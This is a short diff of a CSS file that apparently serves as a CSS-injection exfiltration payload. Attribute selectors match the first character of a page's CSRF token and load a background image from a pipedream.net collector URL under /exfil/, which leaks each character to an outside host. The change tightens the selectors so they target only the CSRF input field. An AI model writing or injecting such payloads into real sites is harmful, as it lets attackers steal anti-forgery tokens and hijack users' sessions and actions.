@@ -1,11 +1,11 @@
-.csrf[value^=a]{
+input.csrf[value^=a]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/a);
 }
 html, body, input[name=csrf][value^=b]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/b);
 }
 
-html, body, .wrapper, .container, input[name=csrf][value^=9]{
+input.csrf[name=csrf][value^=9]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/9);   
 }
 html, body {
